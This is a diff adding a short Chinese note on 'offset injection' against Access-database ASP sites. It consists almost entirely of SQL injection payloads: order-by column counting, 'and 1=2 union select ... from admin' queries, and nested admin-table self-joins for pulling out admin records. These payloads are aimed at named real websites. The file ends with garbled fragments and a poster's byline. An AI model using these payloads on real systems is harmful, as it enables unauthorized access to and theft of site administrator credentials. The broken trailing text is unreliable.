@@ -1,0 +1,38 @@
+                                 Access偏移注入 
+
+
+http://www.jlty.com.cn/tuanwei/onews.asp?id=666
+条件有局限性的必须有id
+有些偏移不出来的!
+inner join
+多表联接建立记录集
+5 10
+from (admin as a inner join admin as b on a.id=b.id) 
+a.id,b.id,* from (admin as a inner join admin as b on a.id=b.id)
+
+a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id)
+
+a.id,b.id,c.id,d.id,* from (((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id) inner join admin as d on a.id=d.id) 
+
+http://www.jlty.com.cn/tuanwei/onews.asp?id=666 order by 13
+
+http://www.jlty.com.cn/tuanwei/onews.asp?id=666 and 1=2 union select 1,2,3,4,5,6,7,8,9,* from admin
+
+13-9
+admin 4 8
+
+
+//**
+order by 22
+
+http://www.smgjmy.com/news_info.asp?id=-576 and+1=2+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,*+from+admin
+
+13-8=5
+
+
+http://www.jlty.com.cn/tuanwei/onews.asp?id=666 and 1=2 union select 1,2,3,4,5,* from (admin as a inner join admin as b on a.id=b.id)
+
+kvdo;87? 
+
+发布者：yf3735 发布时间：kvdo;87? jtak6207
+
